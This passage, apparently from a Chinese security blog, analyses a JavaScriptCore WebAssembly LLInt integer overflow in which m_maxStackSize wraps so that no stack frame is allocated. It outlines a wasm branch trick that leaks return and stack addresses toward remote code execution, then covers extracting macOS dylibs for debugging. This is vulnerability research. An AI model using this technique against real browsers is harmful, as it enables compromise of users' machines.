class="hljs-built_in">emit</span>(<span class="hljs-keyword">this</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>下面第7、11、14行是用来初始化<code>wasmCallingConvention</code>的<code>fprs</code>和<code>gprs</code>成员</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">// jit/GPRInfo.h</span><br><span class="hljs-comment">// 6个GPR寄存器</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> !OS(WINDOWS)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NUMBER_OF_ARGUMENT_REGISTERS 6u</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NUMBER_OF_CALLEE_SAVES_REGISTERS 5u</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NUMBER_OF_ARGUMENT_REGISTERS 4u</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NUMBER_OF_CALLEE_SAVES_REGISTERS 7u</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">GPRInfo</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-keyword">typedef</span> GPRReg RegisterType;<br>    <span class="hljs-type">static</span> <span class="hljs-keyword">constexpr</span> <span class="hljs-type">unsigned</span> numberOfRegisters = <span class="hljs-number">11</span>;<br>    <span class="hljs-type">static</span> <span class="hljs-keyword">constexpr</span> <span class="hljs-type">unsigned</span> numberOfArgumentRegisters = NUMBER_OF_ARGUMENT_REGISTERS;<br><br>    <br><span class="hljs-comment">// jit/FPRInfo.h</span><br><span class="hljs-comment">// 8个FPR寄存器</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">FPRInfo</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-keyword">typedef</span> FPRReg RegisterType;<br>    <span class="hljs-type">static</span> <span class="hljs-keyword">constexpr</span> <span class="hljs-type">unsigned</span> numberOfRegisters = <span class="hljs-number">6</span>;<br>    <span class="hljs-type">static</span> <span class="hljs-keyword">constexpr</span> <span class="hljs-type">unsigned</span> numberOfArgumentRegisters = <span class="hljs-built_in">is64Bit</span>() ? <span class="hljs-number">8</span> : <span class="hljs-number">0</span>;<br>    <br><br><span class="hljs-comment">// WasmCallingConvention.cpp</span><br><span class="hljs-function"><span class="hljs-type">const</span> WasmCallingConvention&amp; <span class="hljs-title">wasmCallingConvention</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">static</span> LazyNeverDestroyed&lt;WasmCallingConvention&gt; staticWasmCallingConvention;<br>    <span class="hljs-type">static</span> std::once_flag staticWasmCallingConventionFlag;<br>    std::<span class="hljs-built_in">call_once</span>(staticWasmCallingConventionFlag, [] () &#123;<br>        Vector&lt;Reg&gt; <span class="hljs-built_in">gprArgumentRegisters</span>(GPRInfo::numberOfArgumentRegisters);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> i = <span class="hljs-number">0</span>; i &lt; GPRInfo::numberOfArgumentRegisters; ++i)<br>            gprArgumentRegisters[i] = GPRInfo::<span class="hljs-built_in">toArgumentRegister</span>(i);<br><br>        Vector&lt;Reg&gt; <span class="hljs-built_in">fprArgumentRegisters</span>(FPRInfo::numberOfArgumentRegisters);<br>...<br>...<br>        staticWasmCallingConvention.<span class="hljs-built_in">construct</span>(<span class="hljs-built_in">WTFMove</span>(gprArgumentRegisters), <span class="hljs-built_in">WTFMove</span>(fprArgumentRegisters), <span class="hljs-built_in">WTFMove</span>(scratchGPRs), RegisterSet::<span class="hljs-built_in">calleeSaveRegisters</span>(), <span class="hljs-built_in">WTFMove</span>(callerSaveRegisters));<br>    &#125;);<br><br>    <span class="hljs-keyword">return</span> staticWasmCallingConvention;<br>&#125;<br></code></pre></td></tr></table></figure><p>下面是截取<code>callInformationForCaller</code>的部分代码，注释部分给了栈布局，首先是FPR寄存器，接着是GPR寄存器，然后才是正常的栈参数。</p><p>比如第26行先将<code>m_stackSize</code>保存起来，在第42行计算所需的栈大小，第50行将栈大小传给参数<code>stackOffset</code>后面用于返回，第55行再恢复原始的初始栈，这里给我的感觉就是像<code>push pop</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">// WasmLLIntGenerator.cpp</span><br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">LLIntGenerator::callInformationForCaller</span><span class="hljs-params">(<span class="hljs-type">const</span> Signature&amp; signature)</span> -&gt; LLIntCallInformation</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// This function sets up the stack layout for calls. The desired stack layout is:</span><br><br>    <span class="hljs-comment">// FPRn</span><br>    <span class="hljs-comment">// ...</span><br>    <span class="hljs-comment">// FPR1</span><br>    <span class="hljs-comment">// FPR0</span><br>    <span class="hljs-comment">// ---</span><br>    <span class="hljs-comment">// GPRn</span><br>    <span class="hljs-comment">// ...</span><br>    <span class="hljs-comment">// GPR1</span><br>    <span class="hljs-comment">// GPR0</span><br>    <span class="hljs-comment">// ----</span><br>    <span class="hljs-comment">// stackN</span><br>    <span class="hljs-comment">// ...</span><br>    <span class="hljs-comment">// stack1</span><br>    <span class="hljs-comment">// stack0</span><br>    <span class="hljs-comment">// ---</span><br>    <span class="hljs-comment">// call frame header</span><br><br>    <span class="hljs-comment">// We need to allocate at least space for all GPRs and FPRs.</span><br>    <span class="hljs-comment">// Return values use the same allocation layout.</span><br><br>    <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> initialStackSize = m_stackSize;<br><br>    <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; callingConvention = <span class="hljs-built_in">wasmCallingConvention</span>();<br>    <span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> gprCount = callingConvention.gprArgs.<span class="hljs-built_in">size</span>();<br>    <span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> fprCount = callingConvention.fprArgs.<span class="hljs-built_in">size</span>();<br><br>    <span class="hljs-type">uint32_t</span> stackCount = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">uint32_t</span> gprIndex = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">uint32_t</span> fprIndex = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">uint32_t</span> stackIndex = <span class="hljs-number">0</span>;<br><br>...<br>...<br><br>    <span class="hljs-comment">// <span class="hljs-doctag">FIXME:</span> we are allocating the extra space for the argument/return count in order to avoid interference, but we could do better</span><br>    <span class="hljs-comment">// <span class="hljs-doctag">NOTE:</span> We increase arg count by 1 for the case of indirect calls</span><br>    m_stackSize += std::<span class="hljs-built_in">max</span>(signature.<span class="hljs-built_in">argumentCount</span>() + <span class="hljs-number">1</span>, signature.<span class="hljs-built_in">returnCount</span>()) + gprCount + fprCount + stackCount + CallFrame::headerSizeInRegisters;<br>    <span class="hljs-keyword">if</span> (m_stackSize % <span class="hljs-built_in">stackAlignmentRegisters</span>())<br>        ++m_stackSize;<br>    <span class="hljs-keyword">if</span> (m_maxStackSize &lt; m_stackSize)<br>        m_maxStackSize = m_stackSize;<br>    <span class="hljs-function">ResultList <span class="hljs-title">arguments</span><span class="hljs-params">(signature.argumentCount())</span></span>;<br>    <span class="hljs-function">ResultList <span class="hljs-title">temporaryResults</span><span class="hljs-params">(signature.returnCount())</span></span>;<br><br>    <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> stackOffset = m_stackSize;<br>    <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> base = stackOffset - CallFrame::headerSizeInRegisters;<br>...<br>...<br><br>    m_stackSize = initialStackSize;<br>    ...<br>    ...<br>    ...<br>   <span class="hljs-keyword">return</span> LLIntCallInformation &#123; stackOffset, stackCount, <span class="hljs-built_in">WTFMove</span>(arguments), <span class="hljs-built_in">WTFMove</span>(commitResults) &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>所以m_stacksize是从16开始：<code>2 callee-saved registers, 6 argument GPRs, and 8 argument FPRs</code>，然后再计算栈上的参数</p><h3 id="栈的运行"><a href="#栈的运行" class="headerlink" title="栈的运行"></a>栈的运行</h3><p>这里提到了两个栈：<code>m_controlStack</code>和<code>m_expressionStack</code>，即一个是控制栈另一个是表达式栈。表达式栈类似于一个模拟栈，它用来跟踪解释器上堆栈的类型，仅用来解析而不执行，主要就是为了确定<code>m_maxStackSize</code>，而<code>m_maxStackSize</code>是用来最终确定需要在栈上开辟多少空间<code>sub rsp, </code></p><p><code>m_controlStack</code>是控制栈，类似于栈的栈，就是当<code>wasm</code>从一个<code>Block</code>进入到另一个<code>Block</code>时，会将当前的表达式栈压入控制栈中，当从中出来时，再利用控制栈恢复。</p><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>每次<code>push</code>操作时，都会检查是否要更新<code>m_maxStackSize</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function">ExpressionType <span class="hljs-title">push</span><span class="hljs-params">(NoConsistencyCheckTag)</span></span><br><span class="hljs-function"></span>&#123;<br>    m_maxStackSize = std::<span class="hljs-built_in">max</span>(m_maxStackSize, ++m_stackSize);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">virtualRegisterForLocal</span>(m_stackSize - <span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>下面是解析完成后，会以四舍五入的形式来进行堆栈对齐，下面就是2个寄存器大小通常是16字节，并且将结果存入<code>m_numCalleeLocals</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">std::unique_ptr&lt;FunctionCodeBlock&gt; <span class="hljs-title">LLIntGenerator::finalize</span><span class="hljs-params">()</span></span><br><span class="hljs-function"> </span>&#123;<br>     ...<br>     m_codeBlock-&gt;m_numCalleeLocals =<br>         WTF::<span class="hljs-built_in">roundUpToMultipleOf</span>(<span class="hljs-built_in">stackAlignmentRegisters</span>(), m_maxStackSize);<br>     ...<br> &#125;<br></code></pre></td></tr></table></figure><p>下面是<code>maxFrameExtentForSlowPathCall</code>的定义，正常架构下是<code>0</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">// MaxFrameExtentForSlowPathCall.h</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> !ENABLE(ASSEMBLER)</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">constexpr</span> <span class="hljs-type">size_t</span> maxFrameExtentForSlowPathCall = <span class="hljs-number">0</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">elif</span> CPU(X86_64)</span><br><span class="hljs-comment">// All args in registers. Windows also uses System V ABI.</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">constexpr</span> <span class="hljs-type">size_t</span> maxFrameExtentForSlowPathCall = <span class="hljs-number">0</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">elif</span> CPU(ARM64) || CPU(ARM64E) || CPU(RISCV64)</span><br><span class="hljs-comment">// All args in registers.</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">constexpr</span> <span class="hljs-type">size_t</span> maxFrameExtentForSlowPathCall = <span class="hljs-number">0</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">elif</span> CPU(ARM)</span><br><span class="hljs-comment">// First four args in registers, remaining 4 args on stack.</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">constexpr</span> <span class="hljs-type">size_t</span> maxFrameExtentForSlowPathCall = <span class="hljs-number">24</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">error</span> <span class="hljs-string">&quot;Unsupported CPU: need value for maxFrameExtentForSlowPathCall&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>下面是确定栈帧大小</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># llint/WebAssembly.asm<br>macro wasmPrologue(codeBlockGetter, codeBlockSetter, loadWasmInstance)<br>    # Set up the call frame and check if we should OSR.<br>    tagReturnAddress sp<br>    preserveCallerPCAndCFR()<br>    preserveCalleeSavesUsedByWasm()<br>    loadWasmInstance()<br>    reloadMemoryRegistersFromInstance(wasmInstance, ws0, ws1)<br><br>    codeBlockGetter(ws0)<br>    codeBlockSetter(ws0)<br><br>    # Get new sp in ws1 and check stack height.<br>    # m_numCalleeLocals --&gt; ws1<br>    loadi Wasm::FunctionCodeBlock::m_numCalleeLocals[ws0], ws1<br>    # 计算所需的字节数<br>    # ws1 = ws1 * 8<br>    lshiftp 3, ws1<br>    # 这里通常是0<br>    addp maxFrameExtentForSlowPathCall, ws1<br>    # cfr - ws1  --&gt; ws1<br>    # 先移动栈，预留出所需的空间<br>    subp cfr, ws1, ws1<br>    # cfr通常表示当前调用帧寄存器，包含当前调用帧的指针<br>    # 如果ws1 &gt; cfr，说明发生了溢出<br>    bpa ws1, cfr, .stackOverflow<br>    bpbeq Wasm::Instance::m_cachedStackLimit[wasmInstance], ws1, .stackHeightOK<br><br>.stackOverflow:<br>    throwException(StackOverflow)<br><br>.stackHeightOK:<br>    # ws1 --&gt; sp<br>    # 如果一切正常就移动栈指针<br>    move ws1, sp<br></code></pre></td></tr></table></figure><p>这里插入<code>CalleeSaveSpaceAsVirtualRegisters</code>的定义，从下面可以看到就是2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asm"># llint/WebAssembly.asm<br># Calling conventions CalleeSaveSpaceAsVirtualRegisters = 2<br>const CalleeSaveSpaceAsVirtualRegisters = constexpr Wasm::numberOfLLIntCalleeSaveRegisters<br>const CalleeSaveSpaceStackAligned = (CalleeSaveSpaceAsVirtualRegisters * SlotSize + StackAlignment - 1) &amp; ~StackAlignmentMask<br>const WasmEntryPtrTag = constexpr WasmEntryPtrTag<br></code></pre></td></tr></table></figure><p>下面是接着<code>wasmPrologue</code>的剩余部分：</p><p><code>CalleeSaveSpaceAsVirtualRegisters * 8</code>这是预留的2个寄存器所占的内存空间</p><p><code>- 8</code>是将地址移至低地址处，准备写入，比如一个单位是8字节，需要移动到该单位的最低地址处</p><p><code>-offset</code>这个offset是由编译器来确定的，把所有gpr寄存器内容都存到栈上，下面同理fpr也会被存到栈上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs asm">    # 下面两个宏定义是将gpr寄存器和fpr寄存器的值存到栈上，其中offset是编译器生成的<br>    # <br>    forEachArgumentGPR(macro (offset, gpr)<br>        storeq gpr, -offset - 8 - CalleeSaveSpaceAsVirtualRegisters * 8[cfr]<br>    end)<br><br>    forEachArgumentFPR(macro (offset, fpr)<br>        stored fpr, -offset - 8 - CalleeSaveSpaceAsVirtualRegisters * 8[cfr]<br>    end)<br><br>    checkSwitchToJITForPrologue(ws0)<br><br>    # Set up the PC.<br>    loadp Wasm::FunctionCodeBlock::m_instructionsRawPointer[ws0], PB<br>    move 0, PC<br><br>    loadi Wasm::FunctionCodeBlock::m_numVars[ws0], ws1<br>    subi NumberOfWasmArguments + CalleeSaveSpaceAsVirtualRegisters, ws1<br>    btiz ws1, .zeroInitializeLocalsDone<br>    negi ws1<br>    sxi2q ws1, ws1<br>    leap (NumberOfWasmArguments + CalleeSaveSpaceAsVirtualRegisters + 1) * -8[cfr], ws0<br>.zeroInitializeLocalsLoop:<br>    addq 1, ws1<br>    storeq 0, [ws0, ws1, 8]<br>    btqz ws1, .zeroInitializeLocalsDone<br>    jmp .zeroInitializeLocalsLoop<br>.zeroInitializeLocalsDone:<br>end<br></code></pre></td></tr></table></figure><p>如前所示内存布局像下面这样，<code>loc0</code> 到 <code>loc13</code> 将由调用约定指定为潜在参数的 6 个 <code>GPR</code> 和 8 个 <code>FPR</code> 组成，因此为了访问 <code>loc0</code>和 <code>loc1</code>，我们需要接受 2 个 <code>i64</code>参数。</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">            |<span class="hljs-string"> ...            </span>|<br>            |<span class="hljs-string"> loc1           </span>|<br>            |<span class="hljs-string"> loc0           </span>|<br>            |<span class="hljs-string"> callee-saved 1 </span>|<br>            |<span class="hljs-string"> callee-saved 0 </span>|<br>rsp, rbp -&gt; |<span class="hljs-string"> previous rbp   </span>|<br>            |<span class="hljs-string"> return address </span>|<br></code></pre></td></tr></table></figure><p>上面在<strong>栈的运行</strong>部分如果我们通过<code>push</code>使得m_maxStackSize设置为 <code>0xffffffff</code>在完成解析后，通过四舍五入将会使得<code>m_numCalleeLocals</code>为0，最终在实际分配栈帧时会让llint认为不需要分配堆栈，栈指针和栈布局如上所示。</p><h2 id="关于利用"><a href="#关于利用" class="headerlink" title="关于利用"></a>关于利用</h2><p><strong>详细部分看参考</strong></p><p>在 llint 中，某些操作被指定为慢速路径，并通过调用 Native C++ 实现来进行。在慢速路径执行的过程中发生的任何压栈操作都可能会覆盖上面的寄存器和locals。下面是一条调用路径：</p><p> “Out-of-line” 跳转目标适用于偏移量太大而无法直接以字节码格式编码的分支。可在wasm层面通过这种形式来调用<code>slow_path_wasm_out_of_line_jump_target</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asm">block<br>      ;; branch out of block<br>      ;; an unconditional `br 0` will not work as the filler would be dead code<br>      i32.const 1<br>      br_if 0<br>      ;; filler code here...<br>      ;; such that the offset from the above branch<br>      ;; to the end of the block is &gt;= 0x80<br>  end<br></code></pre></td></tr></table></figure><p>经过下面的调用链，现在我们在 loc0 中有一个返回地址，它将指向 JavaScriptCore dylib，在 loc1 中有一个堆栈地址，为我们提供了实现远程代码执行所需的信息泄漏。</p><p><img src="/2023/05/06/WASM-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/image-20240914173132601.png"></p><h3 id="调试dylib"><a href="#调试dylib" class="headerlink" title="调试dylib"></a>调试dylib</h3><p>这部分主要围绕调试Mac动态库的方法</p><h4 id="提取dylib"><a href="#提取dylib" class="headerlink" title="提取dylib"></a>提取dylib</h4><p>根据官网，macos从11.0.1开始就将动态链接库放进cache中：</p><p>作为 macOS Big Sur 11.0.1 中的新增功能，该系统附带了所有系统提供的库的内置动态链接器缓存。作为此更改的一部分，文件系统上不再存在动态库的副本。尝试通过在路径中查找文件或枚举目录来检查动态库是否存在的代码将会失败。相反，通过尝试  dlopen() 路径来检查库是否存在，这将正确检查缓存中的库。</p><p>这毫无疑问会对我们反汇编造成困难，因为动态链接库文件不可见，所以就需要先把动态链接库文件提取出来，然后再对其进行反汇编。</p><p>在 Big Sur 上，Apple 对 OS X 文件系统进行了重大更改。系统提供的库从文件系统移动到动态链接器缓存，可以在位于动态链接器缓存目录 <code>/System/Library/dyld</code> 找到我们所需的缓存文件。</p><blockquote><p>根据 <a href="https://developer.apple.com/documentation/macos-release-notes/macos-big-sur-11-beta-release-notes/">macOS Big Sur 11 Beta 发行说明</a>，“系统附带了所有系统提供的库的内置动态链接器缓存。作为此更改的一部分，文件系统上不再存在动态库的副本。如果文件系统上不再存在这些库，那么反汇编它们就会变得非常困难！幸运的是，有一些方法可以从缓存中提取系统库。Apple 自己提供了一种方法：<code>dyld_shared_cache_util</code> 命令行工具。不幸的是，此工具未随 macOS Big Sur 一起安装。但是，该工具是开源的，因此我们可以自己构建它。您可以从 <a href="https://opensource.apple.com/release/macos-10153.html">Apple Open Source</a> 下载 dyld 项目。最新版本的 macOS 10.15.3 稍稍落后，但这对我们的目的来说效果很好。该下载内容包含一个方便的 Xcode 项目。不要费心尝试在 Xcode 中构建所有目标，只需构建<code>dyld_shared_cache_util</code>目标即可。您需要进行大量修改才能成功构建和运行目标。我假设您在 Big Sur 上使用 Xcode 12 进行构建。</p></blockquote><ul><li><p>首先下载dyld源码</p><p>1、每个系统版本都有其对应的<code>dyld</code>版本，我们首先在<a href="https://opensource.apple.com/releases/">Apple Open Source</a>根据操作系统的版本来确定所需的<code>dyld</code>版本；</p><p>2、下载<code>dyld</code>的源码<a href="https://github.com/apple-oss-distributions/dyld/tree/dyld-832.7.3">apple-oss-distributions&#x2F;dyld at dyld-832.7.3 (github.com)</a>，然后切换到指定的版本；</p></li><li><p>编译部分代码</p><p>1、先确定所需的两个文件：<code>dsc_extractor.cpp</code>和<code>dsc_iterator.cpp</code></p><p>2、由于每个系统版本的<code>dyld</code>文件夹内容可能不同，所以我们所需的两个文件可能每个版本所在的文件夹不同，所以我们可能需要先搜索一下位置；</p><p>3、修改<code>dsc_extractor.cpp</code>：</p><p>将下面<code>#if 0</code> 更改为 <code>#if 1</code>来开启测试模式，即能够单独运行</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">// 编译前，需要先将下面0更改为1</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> 0</span><br><span class="hljs-comment">// test program</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;dlfcn.h&gt;</span></span><br><br><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(*extractor_proc)</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* shared_cache_file_path, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* extraction_root_path,</span></span><br><span class="hljs-params"><span class="hljs-function">                              <span class="hljs-type">void</span> (^progress)(<span class="hljs-type">unsigned</span> current, <span class="hljs-type">unsigned</span> total))</span></span>;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> ( argc != <span class="hljs-number">3</span> ) &#123;<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;usage: dsc_extractor &lt;path-to-cache-file&gt; &lt;path-to-device-dir&gt;\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//void* handle = dlopen(&quot;/Volumes/my/src/dyld/build/Debug/dsc_extractor.bundle&quot;, RTLD_LAZY);</span><br>    <span class="hljs-type">void</span>* handle = <span class="hljs-built_in">dlopen</span>(<span class="hljs-string">&quot;/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/usr/lib/dsc_extractor.bundle&quot;</span>, RTLD_LAZY);<br>    <span class="hljs-keyword">if</span> ( handle == <span class="hljs-literal">NULL</span> ) &#123;<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;dsc_extractor.bundle could not be loaded\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    extractor_proc proc = (extractor_proc)<span class="hljs-built_in">dlsym</span>(handle, <span class="hljs-string">&quot;dyld_shared_cache_extract_dylibs_progress&quot;</span>);<br>    <span class="hljs-keyword">if</span> ( proc == <span class="hljs-literal">NULL</span> ) &#123;<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;dsc_extractor.bundle did not have dyld_shared_cache_extract_dylibs_progress symbol\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-type">int</span> result = (*proc)(argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>], ^(<span 